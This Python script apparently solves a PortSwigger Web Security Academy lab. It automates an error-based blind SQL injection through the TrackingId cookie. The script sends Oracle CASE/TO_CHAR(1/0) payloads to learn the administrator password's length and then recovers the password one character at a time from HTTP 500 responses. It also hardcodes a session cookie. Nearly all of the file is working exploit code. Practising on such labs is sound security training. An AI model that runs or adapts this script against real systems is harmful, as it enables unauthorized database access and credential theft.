import string
import requests

URL = "https://0a71009f047f891c8000df2d0042004c.web-security-academy.net/"

SESSION = "KlcGkO2cEhftaytEYsMPiIk4zddImS7E"
BASE_TRACKING_ID = "DI4VJP9jLWq4AFae"

CHARACTERS = string.ascii_lowercase + string.digits

session = requests.Session()

headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}


def send_payload(payload):
    response = session.get(
        URL,
        headers=headers,
        cookies={
            "TrackingId": payload,
            "session": SESSION,
        },
        timeout=10,
    )

    return response


# ---------------------------------------------------------
# Phase 1: Determine password length
# ---------------------------------------------------------

print("[*] Determining password length...")

password_length = None

for length in range(1, 51):

    tracking_id = (
        f"{BASE_TRACKING_ID}'||"
        f"(SELECT CASE WHEN LENGTH(password)>{length} "
        f"THEN TO_CHAR(1/0) ELSE '' END "
        f"FROM users WHERE username='administrator')||'"
    )

    response = send_payload(tracking_id)

    if response.status_code == 500:
        print(f"[+] Password length > {length}")
    else:
        password_length = length
        print(f"[+] Password length: {password_length}")
        break


if password_length is None:
    print("[-] Could not determine password length.")
    exit()


# ---------------------------------------------------------
# Phase 2: Determine each character
# ---------------------------------------------------------

password = ""

print("\n[*] Extracting password...")

for position in range(1, password_length + 1):

    found = False

    for character in CHARACTERS:

        tracking_id = (
            f"{BASE_TRACKING_ID}'||"
            f"(SELECT CASE WHEN "
            f"SUBSTR(password,{position},1)='{character}' "
            f"THEN TO_CHAR(1/0) ELSE '' END "
            f"FROM users WHERE username='administrator')||'"
        )

        response = send_payload(tracking_id)

        # Oracle error causes HTTP 500 when character is correct
        if response.status_code == 500:
            password += character

            print(
                f"[+] Position {position}: {character} "
                f"--> {password}"
            )

            found = True
            break

    if not found:
        print(f"[-] No character found at position {position}")
        break


print("\n[+] Password:", password)